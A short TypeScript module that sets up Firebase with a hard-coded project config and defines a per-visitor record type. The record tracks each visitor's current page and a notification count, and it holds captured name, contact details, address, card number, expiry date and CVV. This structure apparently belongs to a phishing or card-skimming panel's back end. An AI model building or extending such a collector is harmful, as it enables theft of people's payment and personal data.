import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyAOMWwG8WZri2ii4pDSvTdapkbnBJMfA-4",
  authDomain: "poopopu-2a65b.firebaseapp.com",
  projectId: "poopopu-2a65b",
  storageBucket: "poopopu-2a65b.firebasestorage.app",
  messagingSenderId: "326639379667",
  appId: "1:326639379667:web:b8ea84c7feefd6264aa026",
  measurementId: "G-3FYJBGX7D5"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
